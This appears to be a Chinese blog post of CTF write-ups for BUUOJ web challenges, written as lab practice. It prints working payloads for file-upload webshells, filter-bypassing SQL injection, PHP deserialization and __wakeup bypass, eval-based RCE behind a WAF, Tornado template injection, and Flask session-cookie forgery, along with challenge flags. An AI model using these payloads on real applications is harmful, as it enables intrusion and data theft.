---
categories:
- Security
- CTF
date: '2023-04-28 16:59:00'
excerpt: false
hidden: false
thumbnail: /hide_imgs/post_thumbnail.png
title: BUUOJ——WEB（二）
updated: '2023-07-29 20:50:00'

---

## [ACTF2020 新生赛]Upload（1）

上传文件的题目，直接上传php文件，在前端被检测出来，提示只能使用gif，png，jpg等后缀，下断点绕过前端检测后，php文件仍无法上传，服务器过滤了黑名单"php"，尝试"PHP"，可以上传，但服务器无法解析为php文件（Linux？），尝试"phtml"，上传成功且服务器可以解析！直接利用一句话木马 `cat /flag` 即可

flag：flag{a8a3d35f-375b-44e1-932a-b9edcd5e76b0}

## [极客大挑战 2019]BabySQL（1）

Tips：本题直接在username中注入即可，passwd随便填写

### 解法一：报错注入

利用：`1' pat` 可以试探pat是否被过滤，测试发现"selelct","or","and","from"遭到了过滤，但只是删除一次完全匹配的字符串，可以利用"oorr"来绕过，单引号注入有效，登陆成功后只给了密码，flag需要利用报错注入得到

堆叠注入无效，分号没被过滤但无法利用分号执行多语句，会出现"SQL syntax error"

利用"extractvalue()"进行报错注入时应注意，若语句执行成功会出现"XPATH syntax error"，可以得到关键信息；若语句执行不成功会出现"SQL syntax error"，无法获得关键信息。应区分有效与无效的报错

**本题由于存在or过滤，很多函数包含or的都要反过滤**

获取库名：

```sql
1' oorr extractvalue(1, concat(0x7e, database(), 0x7e))#

-> XPATH syntax error: '~geek~'
```

获取表名：

```sql
1' oorr extractvalue(1, concat(0x7e, (seselectlect group_concat(table_name) frfromom infoorrmation_schema.tables whwhereere table_schema='geek'), 0x7e))    #

->~b4bsql,geekuser~
```

获取列名：

```sql
1' oorr extractvalue(1, concat(0x7e, (seselectlect group_concat(column_name) frfromom infoorrmation_schema.columns whwhereere table_name='b4bsql'), 0x7e))  #

->id,username,password
```

连接后直接查询看看，由于报错一般都有长度限制，因此用substring函数截取：

```sql
1' oorr extractvalue(1, concat(0x7e, subsubstrstr((seselectlect group_concat(passwoorrd) frfromom b4bsql),1,16), 0x7e))  #
```

这里过滤了substr（`substring` 与 `substr` 是具有相同功能的函数），先利用 `locate(substr, str)` 定位flag位置，再查找：

```sql
1' oorr extractvalue(1, concat(0x7e, locate("flag{",(seselectlect group_concat(passwoorrd) frfromom b4bsql)), 0x7e))  #

->XPATH syntax error: '~153~'

1' oorr extractvalue(1, concat(0x7e, left((seselectlect group_concat(passwoorrd) frfromom b4bsql),153，24), 0x7e))#

->XPATH syntax error: '~flag{3015460e-88df-4ebb-~'

1' oorr extractvalue(1, concat(0x7e, subssubstrtr((seselectlect group_concat(passwoorrd) frfromom b4bsql),177,24), 0x7e))  #

->XPATH syntax error: '~b356-0043a5c16392}~'
```

得到flag：flag{3015460e-88df-4ebb-b356-0043a5c16392}

* `group_concat(column_name1,column_name2)` 将多行结果合并为一行，多列结果合并为一列；列与列直接之间相连，随后不同行的的数据用 `,` 分隔，逐行进行扫描
* [SQL字符串截取](https://www.cnblogs.com/vofill/p/6806962.html)
* `left(length)` 在读取到最大长度后就不能再读取了；`right(length)` 在读取到最大长度后读取的起点会向左偏移，它先检索到字符串起点，再读取子串
* `extract('目标xml文件名', 'xml中检索的字符串')` 该函数用于查询xml文件中的特定字符串，`0x7e` 代表字符 `~` ，拼接在要获取的信息周围再拼接到路径中去就会在字符串周围产生错误，从而报错注入

### 其他打开方式

参考：[极客大挑战 2019 BabySQL](https://blog.csdn.net/qq_36618918/article/details/121691162)

（原来FUZZ就是扫描）先FUZZ测试过滤词典；然后利用 `order by num` 中num不能大于等于列数来获取字段个数（by也被过滤）：

```sql
' oorrder bbyy 4--

->Unknown column '4' in 'order clause'
```

能测试出只有三个字段，利用 `union select` 测试回显的字段：

```sql
' ununionion seselectlect 1,2,3-- 

->Hello 2！Your password is '3'
```

说明回显位为第二个字段和第三个字段，查询所有库：

```sql
' ununionion seselectlect 1,2,group_concat(schema_name) frfromom infoorrmation_schema.schemata-- 

->'information_schema,mysql,performance_schema,test,ctf,geek'
```

查询CTF库的所有表：

```sql
' ununionion seselectlect 1,2,group_concat(table_name) frfromom infoorrmation_schema.tables whwhereere table_schema='ctf'-- 

->Your password is 'Flag'
```

查询FLAG表的字段：

```sql
' ununionion seselectlect 1,2,group_concat(column_name) frfromom infoorrmation_schema.columns whwhereere table_name='Flag'-- 

->Your password is 'flag'
```

只有一个字段flag，读取flag：

```sql
' ununionion seselectlect 1,2,group_concat(flag) frfromom ctf.Flag-- 

->Your password is 'flag{893a0115-fb96-44be-947f-0d1c1ab52346}'
```

字段从flag替换为 `*` 不行。

## [极客大挑战 2019]PHP（1）

网站源码有备份，用dirmap扫出来是"WWW.zip"（记下来了），解压后得到网站的完整源码。有一个反序列化的洞，用GET方式上传一个"select"，getSerialize代码如下：

```php
<?php 

class Name{
    private $username = 'admin';
    private $password = 100;
}
$a=new Name;
echo serialize($a);

?>
```

这里有一个问题，注意到类中的两个变量都是"private"，经过测试，php版本为7.1或5.6时，序列化严格区分private和public，传入的是哪种类型就会得到哪种类型的变量，而本题的环境需要严格区分两种类型，需要传入private类型两个变量参数，很不巧的是private类型序列化后得到的内容是这样的：

```php
O:4:"Name":2:{s:14:"\000Name\000username";s:5:"admin";s:14:"\000Name\000password";i:100;}
```

其中"\\000"是空字符，使用phpstudy，php版本为7.3.4搭建环境测试时，空字符在网页中完全不输出（不占位置），但在字符串中会计入长度，而他们是标记参数类型的重要字符，因此必须要有，因此传入网站时用URL编码为"%00"。另一个问题，源码中有一个魔术函数：

```php
function __wakeup(){
        $this->username = 'guest';
    }
```

该函数会在调用 `unserialize()` 函数时优先调用，强行修改"username"参数，因此需要绕过这个 `__wakeup()` ，在PHP5<5.6.25，PHP7 < 7.0.10时，传入的反序列化字符串中如果对象的变量个数参数大于实际的变量个数，那么就会绕过"__wakeup"，因此最终传入的payload：

```php
?select=O:4:"Name":3:{s:14:"%00Name%00username";s:5:"admin";s:14:"%00Name%00password";i:100;}
```

Name中实际上只有两个参数，将数量参数修改为3即可实现绕过。

### PHP

个人感觉本题是想考察"__wakeup"的绕过，但随着php版本的更新，序列化对public与其他两种类型的识别也发生了变化。在PHP7=7.3.4的环境中测试，传入的对象为public类型的参数时，"username"和"password"被当作private类型处理并序列化为了对象：

```php
O:4:"Name":2:{s:8:"username";s:5:"admin";s:8:"password";i:100;}

-> object(Name)#1 (2) {
    ["username":"Name":private]=>
    string(5) "guest"
    ["password":"Name":private]=>
    int(100)
}
```

猜测在这里，php优先根据变量名称进行匹配，弱化了类型的区别直接赋值

但使用PHP5=5.6或PHP7=7.1时private类型与public类型进行了严格区分，不同类型"username"被识别不同的变量：

```php
O:4:"Name":2:{s:8:"username";s:5:"admin";s:8:"password";i:100;}

->
object(Name)#1 (4) {
  ["username":"Name":private]=>
  string(5) "guest"
  ["password":"Name":private]=>
  string(6) "yesyes"
  ["username"]=>
  string(5) "admin"
  ["password"]=>
  int(100)
}
```

这里严格区分了不同类型的变量，对于原来不存在的"public"类型的"username"直接新建并赋值，对于序列化中不存在的"private"类型的"username"通过类定义获取，因此就有了四个变量。

* `vardump()` 输出变量的信息，包括对象与一般变量
* `error_reporting(0)` 关闭报错信息的输出
* `\00` 代表空字符，有些环境中它不输出，有些环境中它会占位，但输出为空，此时复制粘贴得不到它，因此需要自己添加。为了在php的字符串中表示空字符，需要：`"\000"` 。需要说明的是，php中反引号不识别转义，单引号只认识"\\\\"双反斜杠表示的但反斜杠，只有双引号才能完整识别转义，因此表示空字符时需要双引号包裹。
  成功被识别的空字符会被记录到字符串长度中。
* `<br>` 与 `</br>` 都是换行



参考：[

[PHP在线测试](https://code.y444.cn/php)，

[PHP——serialize()序列化类变量public、protected、private的区别](https://blog.csdn.net/Xxy605/article/details/117336343)，

]

## [ACTF2020 新生赛]BackupFile

访问"index.php.bak"下载源码文件：

```php
<?php
include_once "flag.php";

if(isset($_GET['key'])) {
    $key = $_GET['key'];
    if(!is_numeric($key)) {
        exit("Just num!");
    }
    $key = intval($key);
    $str = "123ffwsfwefwf24r2f32ir23jrw923rskfjwtsw54w3";
    if($key == $str) {
        echo $flag;
    }
}
else {
    echo "Try to find out source file!";
}

```

考察PHP的神奇弱类型比较，只能输入数字并要与字符串相等，payload：

```
?key=123
```

得到flag：flag{41e5ff6a-626b-4d84-a9f9-25705676b098}

## [RoarCTF 2019]Easy Calc

参考：[Easy_Calc_WP](https://www.cnblogs.com/echoDetected/p/13091486.html)

起初以为是JS写的，实际上是PHP写的calc。F12中注释标明有防火墙，实际上防火墙有两层，一层是源码中的，过滤敏感字符；一层是服务器的（大概），检测到指定参数中有敏感字符则直接拒绝访问。

通过观察JS源码可以发现，一个隐藏的php文件是"calc.php"

JS源码：

```javascript
    $('#calc').submit(function(){
        $.ajax({
            url:"calc.php?num="+encodeURIComponent($("#content").val()),
            type:'GET',
            success:function(data){
                $("#result").html(`<div class="alert alert-success">
            <strong>答案:</strong>${data}
            </div>`);
            },
            error:function(){
                alert("这啥?算不来!");
            }
        })
        return false;
    })
```

令人意想不到的是直接访问"calc.php"能看到源码（这合理吗？）

"calc.php"源码：

```php
<?php
error_reporting(0);
if(!isset($_GET['num'])){
    show_source(__FILE__);
}else{
        $str = $_GET['num'];
        $blacklist = [' ', '\t', '\r', '\n','\'', '"', '`', '\[', '\]','\$','\\','\^'];
        foreach ($blacklist as $blackitem) {
                if (preg_match('/' . $blackitem . '/m', $str)) {
                        die("what are you want to do?");
                }
        }
        eval('echo '.$str.';');
}
?>
```

源码提供了第二层过滤的信息，ban掉了很多空白字符。目标是利用eval实现RCE；第一层过滤体现在服务器上，检测参数num是否含有一些敏感字符。

1. 传参时通过在num前加一个空格来绕过第一层防火墙，原理是php在解析传参时会自动处理参数名前的空白字符，而服务器又会准确识别空白字符，这就导致服务器端与PHP端的处理出现差异，服务器认为是名为空格+num的参数被传了过来，因此不做防火墙检测；PHP端则去掉了空格，将传递的参数名依旧识别成num，因此内容正确的传递给了变量 `$_GET['num']` 但又绕过了服务器的防火墙。

2. 读取目录payload：

   ```php
   %20num=1;var_dump(scandir(chr(47)))
   ```

   scandir扫描目标目录下的内容并转化成对象格式，由于 `"/"` 中的引号被过滤，使用 `chr(47)` 替代，得到结果中发现：

   ```
   [7]=> string(5) "f1agg"
   ```

   读取flag：

   ```php
   ?%20num=1;var_dump(file_get_contents(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103)))
   ```

   `file_get_contents()` 读取指定文件的内容，拼接chr字符得到字符串 `"/f1agg"` 从而获取flag：

   ```
   1string(43) "flag{d715621b-fd8a-480d-8127-c95614ff05c3} "
   ```


## [极客大挑战 2019]BuyFlag

F12发现PHP源码片段：

```html
<!--
	~~~post money and password~~~
if (isset($_POST['password'])) {
	$password = $_POST['password'];
	if (is_numeric($password)) {
		echo "password can't be number</br>";
	}elseif ($password == 404) {
		echo "Password Right!</br>";
	}
}
-->
```

`%00404` 可以绕过 `is_numeric()` 但 `$password==404` 不成立

`404%20` 与 `404%00` 既可以绕过数字判定又与404弱类型相等。

Cookie中 `user=1` 表示是Cuiter。

`money=100000000` 会提示传入长度过长，使用 `1e16` 即可通过money检测。

最终payload的HTTP包：

```http
POST /pay.php HTTP/1.1
Host: 1e5d8ff4-ebfd-4e54-85fc-3f24f03178db.node4.buuoj.cn:81
Content-Length: 26
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://1e5d8ff4-ebfd-4e54-85fc-3f24f03178db.node4.buuoj.cn:81
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://1e5d8ff4-ebfd-4e54-85fc-3f24f03178db.node4.buuoj.cn:81/index.php
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: user=1
Connection: close

password=404%00&money=1e10
```

 得到flag：`flag{f811808d-0044-423a-a7f8-363edd027b54}`

## [BJDCTF2020]Easy MD5

参考：[Easy MD5-wp](https://blog.csdn.net/weixin_50597969/article/details/115492810)

共有三关，第一关提示在HTTP响应头中：

```http
Hint: select * from 'admin' where password=md5($pass,true)
```

要实现还是SQL注入，但要求是字符串经过 `md5()` 转化后达到注入的效果，例如 `ffifdyop` md5加密后变成 `'or'...` 后面跟上一串无引号的字符串即可实现注入，最重要的是加密后前几个字符依次为单引号、or、单引号，可以编写如下脚本去爆破一个类似的：

```php
<?php
$b[] = 5;
// var_dump($_GET['a']);
// var_dump($b);


$cnt = 0;
$all = 0;
$blank = "";
for($i=0; $i<150; $i++){
    $blank=$blank."";
}

function burst($num, $str){
    global $blank, $cnt, $all;
    $cnt += 1;
    if($num<1){
        $tmp = md5($str);
        echo "\r".$blank;
        echo "\r".$cnt."/".$all."--md5(".$str.") = ".$tmp;
        if(strlen($tmp)>4 and substr($tmp, 0, 1) == "'") echo "md5(".$str.") = ".$tmp."\n";
        return;
    }
    for($i=65; $i<123; $i++){
        burst($num-1, $str.chr($i));
    }
}

for($i=8; $i<9; $i++){
    $all = pow(58, 8);
    burst($i, "");
}
```

`php index.php` 可以以脚本形式运行php，若是以服务器文件加载php脚本，过长的爆破时间会导致服务器响应超时。实际上该爆破由于爆破时间过长并不可行。

Tips：php可以以脚本形式运行，在配过PHP环境的情况下，直接 `php index.php` 即可以脚本方式运行php源码。

注入成功后进入第二关，F12看到源码提示：

```php
<!--
$a = $GET['a'];
$b = $_GET['b'];

if($a != $b && md5($a) == md5($b)){
    // wow, glzjin wants a girl friend.
-->
```

用数组即可：`?a[]=1&b[]=2` 

进入第三关：

```php
<?php
error_reporting(0);
include "flag.php";

highlight_file(__FILE__);

if($_POST['param1']!==$_POST['param2']&&md5($_POST['param1'])===md5($_POST['param2'])){
    echo $flag;
}
```

虽然变成了严格比较，但是数组依然能绕过（因为md5解析数组都是NULL）：`param1[]=1&param2[]=2` 

最后得到flag：`flag{22d586ce-674e-44d8-af08-729a476d4f6a}` 

## [护网杯 2018]easy_tornado

参考：[2018护网杯(WEB)easy_tornado(模板注入)](https://www.cnblogs.com/xhds/p/12285121.html)

"/flag.txt"提示flag在"/fllllllllllllag"中

"/welcome.txt"返回"render"提示存在模板注入(?)

"/hints.txt"提示filehash的加密方式：

```php
md5(cookie_secret+md5(filename))
```

目标是拿到"/fllllllllllllag"的filehash，首先需要拿到cookie_secret。

tornado模板下传入：`{{handler.settings}}` 可以获取环境变量

```
/error?msg={{2*7}}

=> ORZ
(这算是注入成了?)
```

```
/error?msg={{handle/settings}}

=> {'autoreload': True, 'compiled_template_cache': False, 'cookie_secret': '39cedf08-4782-4456-b648-fa29f2c3aba9'}
```

PHP脚本跑一下可以获得filehash：

```php
<?php
echo md5("39cedf08-4782-4456-b648-fa29f2c3aba9".md5("/fllllllllllllag"));

$file_hash = array(
    "/hints.txt" => "6718cdb87bbfdf01834d2ff058dfc77a", 
    "/hints.txt-res" => "85873c38514234be233f9318a17450f5",
    "/flag.txt" => "40dfb7391c19a66939e6b6f4e9898804", 
    "/flag.txt-res" => "e27ed0a861b00185d3429dd62561bd1c",
    "/welcome.txt" => "89aebe7e1c82925a8896b18ed6bd3335",
    "/welcome.txt-res" => "617415f68384bc7b96ee0b6b0df42809"
    )
?>
```

filehash：`06d280b8d701aaea9f2c8bc5e21605b6`

payload：

```
/file?filename=/fllllllllllllag&filehash=06d280b8d701aaea9f2c8bc5e21605b6

=> /fllllllllllllag
flag{811abc8f-ce7b-4c88-bb5b-4c89a65efac0}
```

## [HCTF 2018]admin

Login过滤了引号，时间盲注不成功

参考：[一题三解——[HCTF 2018]admin](https://www.anquanke.com/post/id/164086)

---

### 思路一：Session伪造

[Flask-Session加密解密](https://github.com/noraj/flask-session-cookie-manager)

随意注册一个账号后，在修改密码的页面源码中能看到网站源码的Github仓库。由于我做这题时仓库中的源码已经消失了，因此主要看WP解题（233）

源码中显示只要Session中的"name"键的值为"admin"即可获得管理员权限，因此目标是伪造Session。

Flask对Session进行了签名处理后标记在Cookie后，用来检查Cookie是否被篡改；Session的编码过程在Flask源码中可见，可以编写逆处理脚本还原Json对象，查看Session内容：

```python
import sys
import zlib
from base64 import b64decode
from flask.sessions import session_json_serializer
from itsdangerous import base64_decode

def decryption(payload):
    payload, sig = payload.rsplit(b'.', 1)
    payload, timestamp = payload.rsplit(b'.', 1)

    decompress = False
    if payload.startswith(b'.'):
        payload = payload[1:]
        decompress = True

    try:
        payload = base64_decode(payload)
    except Exception as e:
        raise Exception('Could not base64 decode the payload because of '
                         'an exception')

    if decompress:
        try:
            payload = zlib.decompress(payload)
        except Exception as e:
            raise Exception('Could not zlib decompress the payload before '
                             'decoding the payload')

    return session_json_serializer.loads(payload)

if __name__ == '__main__':
    print(decryption(sys.argv[1].encode()))
```

先随意注册一个账号，拿到一串Session：

```
.eJw9kM2KwjAUhV9luGsXjrYbwUWH1KJwE5Royd2Io7Ex6XWgVdqJ-O5TZHB9Dt_5ecD-3NjWwezW3O0I9pcTzB7w8Q0zkLr2WK6jYZOSDlHqqlN6PSXhalmSk8XKI2-80cuE9LInsWKls0Tq4xh9mKLIOyW2Cfk8VeLkpHcBdehILNjoTa10PjExSwZfjzrrsMwTLFeDzyTEC8aCamIcy1ilVC4cecmosZdDhhJZbyLVkreJYZzDcwTHtjnvbz_BXt8TiHfB-OOUChNl3Dj0-VBnVyuRp-i_ghKhl8X613jHqsQBaSZYzV-4Cx8q-yadtrvO_ivXAw8CnG17u8MI7q1tXr_B5xief8q8blk.ZGTtEQ.85FS0oT2YTk2KHJbNYzcvA_coIY
```

用脚本解码后得到：

```json
{'_fresh': True, '_id': b'59c1d3bf9e93580947d8e5fa4bc2dca28e21d2f908574297010858f1987a68d190d1fa4e916c080111001a81ba668faf0fefc4789eaaf3f131508801c6e6e8bc', 'csrf_token': b'fedb77df374a218f5e81920d8914d2b8f9c1c662', 'image': b'uEpz', 'name': 'festu', 'user_id': '10'}
```

修改name再加密回去，由于要正确的签名，需要"secret_key"，在源码中可以找到 `SECRET_KEY = os.environ.get('SECRET_KEY') or 'ckj123'` ，再利用脚本进行加密：

```powershell
py flask_session_cookie_manager3.py encode -s ckj123 -t "{'_fresh': True, '_id': b'59c1d3bf9e93580947d8e5fa4bc2dca28e21d2f908574297010858f1987a68d190d1fa4e916c080111001a81ba668faf0fefc4789eaaf3f131508801c6e6e8bc', 'csrf_token': b'fedb77df374a218f5e81920d8914d2b8f9c1c662', 'image': b'uEpz', 'name': 'admin', 'user_id': '10'}"

=>.eJw9kM2KwjAUhV9luGsXjqYbwUWH1KJwE5Royd2IY2tj0utAVdqJ-O5TZHB9Dt_5ecD-1FZXB7Nbe69GsD-XMHvAxzfMQJnGY7GOlm1CJkRl6k6b9ZSka1RBTuUrj7zx1iwFmWVPcsXapEKZ4xh9mKLMOi23gnyWaFk65V1AEzqSC7Zm02iTTWxMxeDr0aQdFpnAYjX4rCBeMObUEONYxTqhYuHIK0aDvRoytEx7G6lRvBWWcQ7PERyv7Wl_-wnV5T2BeBesP04pt1HFjUOfDXV2jZZZgv4raBl6la9_rXesCxyQdoL1_IU786Gu3qRyu-uqf-Vy4EGAQ8nnC4zgfq3a12_wOYbnH8hybjs.ZGT15A.3MkVXDRdC8_LSSMPuX9Kw5Q5vwU
```

将其复制进Session中即可得到Flag：`flag{b865b8d4-cb96-4f76-b368-cb72b79f30ec}`

装脚本的时候遇到了一些有趣的问题，由于文件夹一开始命名为"[HCTF 2018]admin" 含有空格和 `[]` 符号，Powershell读取不出，因此右键打开终端时，终端路径自动跳转到了Powershell可执行文件的位置。删除空格和 `[]` 后恢复正常。

GitHub下载下源码后，需要更改"setup.py"的内容才能安装：

```python
#/usr/bin/env python

import codecs
import os
import sys

from os.path import join, dirname
from setuptools import setup, find_packages	# Mark1
import codecs


read = lambda filepath: codecs.open(filepath, 'r', 'utf-8').read()

if 'publish' in sys.argv:
    os.system('python -m twine upload dist/*')
    sys.exit()
if 'package' in sys.argv:
    os.system('python setup.py bdist bdist_egg')
    sys.exit()

setup(
    name="flask-session-cookie-manager",
    packages=find_packages(include=['flask-session-cookie-manager2', 'flask-session-cookie-manager3']),		# Mark2
    version='1.2.1.1',
    description="simple Python script to deal with Flask session cookie",
    long_description=read(join(dirname(__file__), 'README.md')),
    long_description_content_type='text/markdown',
    keywords='Flask session cookie',
    author='Wilson Sumanang, Alexandre ZANNI',
    maintainer='Alexandre ZANNI, TAbdiukov',
    license='MIT',
    url='https://github.com/noraj/flask-session-cookie-manager',
    include_package_data=True,
    classifiers=[
        'Operating System :: OS Independent',
        'Programming Language :: Python',
        'Programming Language :: Python :: 2',
        'Programming Language :: Python :: 3',
        'License :: Other/Proprietary License',
        'Topic :: Security',
        'Topic :: Utilities',
        'Environment :: Console',
        'Intended Audience :: Other Audience',
    ],
    install_requires=['itsdangerous', 'Flask'],
    # https://python-packaging.readthedocs.io/en/latest/command-line-scripts.html
    scripts=['flask_session_cookie_manager2.py', 'flask_session_cookie_manager3.py'],
)

```

Mark处是更改的地方，由于安装依赖的顶层包有两个版本2和3，因此setup在读取时不知道读取哪个，就会产生报错：

```powershell
error: Multiple top-level packages discovered in a flat-layout:...
```

该脚本的安装需要同时用到两个依赖，因此需要手动指定用到的包，即Mark2处的内容。

### 思路二：